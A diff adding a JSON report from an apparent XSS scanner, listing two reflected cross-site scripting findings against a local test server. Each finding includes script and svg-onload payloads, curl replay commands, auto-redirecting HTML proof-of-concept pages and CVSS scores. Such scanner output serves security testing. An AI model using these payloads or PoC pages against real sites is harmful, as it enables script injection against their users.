@@ -1,0 +1,71 @@
+{
+  "tool": "XSSentinel",
+  "target": "http://127.0.0.1:8899/echo?q=test",
+  "generated": "2026-07-28 17:43:50",
+  "requests": 19,
+  "waf": null,
+  "findings": [
+    {
+      "url": "http://127.0.0.1:8899/echo",
+      "method": "GET",
+      "param": "q",
+      "type": "reflected",
+      "context": "html_element",
+      "payload": "<script>alert('xssv_3eda3b35')</script>",
+      "transform": [],
+      "severity": "high",
+      "confidence": "high",
+      "detail": "token reflected inside <script> element text",
+      "headless": null,
+      "proof": {
+        "status": 200,
+        "method": "GET",
+        "param": "q",
+        "payload": "<script>alert('xssv_3eda3b35')</script>",
+        "snippet": "<html><body>You searched: <script>alert('xssv_3eda3b35')</script></body></html>"
+      },
+      "poc": {
+        "curl": "curl -i 'http://127.0.0.1:8899/echo?q=%3Cscript%3Ealert%28%27xssv_3eda3b35%27%29%3C%2Fscript%3E'",
+        "url": "http://127.0.0.1:8899/echo?q=%3Cscript%3Ealert%28%27xssv_3eda3b35%27%29%3C%2Fscript%3E",
+        "html": "<html><body>\n<iframe src=\"http://127.0.0.1:8899/echo?q=%3Cscript%3Ealert%28%27xssv_3eda3b35%27%29%3C%2Fscript%3E\" onload=\"window.location.href='http://127.0.0.1:8899/echo?q=%3Cscript%3Ealert%28%27xssv_3eda3b35%27%29%3C%2Fscript%3E'\"></iframe>\n<script>window.location.href=\"http://127.0.0.1:8899/echo?q=%3Cscript%3Ealert%28%27xssv_3eda3b35%27%29%3C%2Fscript%3E\";</script>\n</body></html>"
+      },
+      "cvss_score": 5.3,
+      "cvss_severity": "medium",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+      "replay": {
+        "curl": "curl -s -k 'http://127.0.0.1:8899/echo?q=%3Cscript%3Ealert%28%27xssv_3eda3b35%27%29%3C%2Fscript%3E'",
+        "browser_url": "http://127.0.0.1:8899/echo?q=%3Cscript%3Ealert%28%27xssv_3eda3b35%27%29%3C%2Fscript%3E",
+        "html_poc": "<!DOCTYPE html>\n<html>\n<head><title>XSS PoC</title></head>\n<body>\n<p>Click the link to trigger the XSS:</p>\n<a href=\"http://127.0.0.1:8899/echo?q=%3Cscript%3Ealert%28%27xssv_3eda3b35%27%29%3C%2Fscript%3E\">Trigger XSS</a>\n<script>setTimeout(function(){window.location='http://127.0.0.1:8899/echo?q=%3Cscript%3Ealert%28%27xssv_3eda3b35%27%29%3C%2Fscript%3E';}, 500);</script>\n</body>\n</html>"
+      }
+    },
+    {
+      "url": "http://127.0.0.1:8899/__xssentinel_err__/%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E",
+      "method": "GET",
+      "param": "(error_path)",
+      "payload": "<svg/onload=alert('xserr_b282c5')>",
+      "context": "text",
+      "severity": "high",
+      "poc_curl": "curl -i http://127.0.0.1:8899/__xssentinel_err__/%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E",
+      "poc_html": "<a href=\"http://127.0.0.1:8899/__xssentinel_err__/%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E\">click to trigger error-page XSS PoC</a>",
+      "status_code": 404,
+      "type": "error_page_xss",
+      "confidence": "high",
+      "detail": "error page (404) reflects payload: token reflected in onload handler",
+      "headless": null,
+      "proof": null,
+      "poc": {
+        "curl": "curl -i 'http://127.0.0.1:8899/__xssentinel_err__/%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E?%28error_path%29=%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E'",
+        "url": "http://127.0.0.1:8899/__xssentinel_err__/%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E?%28error_path%29=%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E",
+        "html": "<html><body>\n<iframe src=\"http://127.0.0.1:8899/__xssentinel_err__/%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E?(error_path)=%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E\" onload=\"window.location.href='http://127.0.0.1:8899/__xssentinel_err__/%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E?(error_path)=%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E'\"></iframe>\n<script>window.location.href=\"http://127.0.0.1:8899/__xssentinel_err__/%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E?(error_path)=%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E\";</script>\n</body></html>"
+      },
+      "cvss_score": 5.3,
+      "cvss_severity": "medium",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+      "replay": {
+        "curl": "curl -s -k 'http://127.0.0.1:8899/__xssentinel_err__/%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E?%28error_path%29=%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E'",
+        "browser_url": "http://127.0.0.1:8899/__xssentinel_err__/%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E?%28error_path%29=%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E",
+        "html_poc": "<!DOCTYPE html>\n<html>\n<head><title>XSS PoC</title></head>\n<body>\n<p>Click the link to trigger the XSS:</p>\n<a href=\"http://127.0.0.1:8899/__xssentinel_err__/%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E?%28error_path%29=%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E\">Trigger XSS</a>\n<script>setTimeout(function(){window.location='http://127.0.0.1:8899/__xssentinel_err__/%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E?%28error_path%29=%3Csvg%2Fonload%3Dalert%28%27xserr_b282c5%27%29%3E';}, 500);</script>\n</body>\n</html>"
+      }
+    }
+  ]
+}
